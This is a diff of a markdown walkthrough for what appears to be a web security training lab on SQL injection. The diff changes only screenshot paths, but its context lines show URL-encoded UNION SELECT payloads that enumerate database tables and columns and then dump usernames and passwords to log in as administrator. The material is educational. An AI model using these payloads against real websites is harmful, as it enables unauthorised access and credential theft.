@@ -9,7 +9,7 @@ To solve the lab, log in as the `administrator` user.
 
 ___
 **HINT:**
-![screnshot](./images/lab9_listing_content_of_database.png)
+![screnshot](images/lab9_listing_content_of_database.jpg)
 
 `SELECT * FROM information_schema.tables--`  => for table like `Product`,`Users` etc
 `SELECT * FROM information_schema.columns WHERE table_name = 'Users'` => for `UserId`, `Password`
@@ -19,7 +19,7 @@ step 1
 select any category then go to
 burpsuite => proxy => http history => click on =>`/filter?category=pets` => send to repeater
 
-![screnshot](./images/lab9_category_pets.png)
+![screnshot](images/lab9_category_pets.jpg)
 
 step 2
 
@@ -36,7 +36,7 @@ convert to URL Encoded
 
 `/filter?category=Pets'+UNION+SELECT+NULL,TABLE_NAME+FROM+information_schema.tables--`
 
-![screnshot](./images/lab9_user_table.png)
+![screnshot](images/lab9_user_table.jpg)
 
 Table => `users_xqqeus`
 
@@ -55,7 +55,7 @@ convert to URL Encoded
 
 `/filter?category=Pets'+UNION+SELECT+NULL,COLUMN_NAME+FROM+information_schema.columns+WHERE+table_name+%3d+'users_xqqeus'--`
 
-![screnshot](./images/lab9_user_id_password.png)
+![screnshot](images/lab9_user_id_password.jpg)
 
 User-id => `username_wifoyz` Password => `password_jipwdz`
 
@@ -74,7 +74,7 @@ convert to URL Encoded
 
 `/filter?category=Pets'+UNION+SELECT+username_wifoyz,password_jipwdz+FROM+users_xqqeus--`
 
-![screnshot](./images/lab9_administrator_password.png)
+![screnshot](images/lab9_administrator_password.jpg)
 
 
 step 5
@@ -87,4 +87,4 @@ To solve the lab use administrator id and password
 </tr>
 ```
 
-![screnshot](./images/lab9_solved_lab.png)
+![screnshot](images/lab9_solved_lab.jpg)
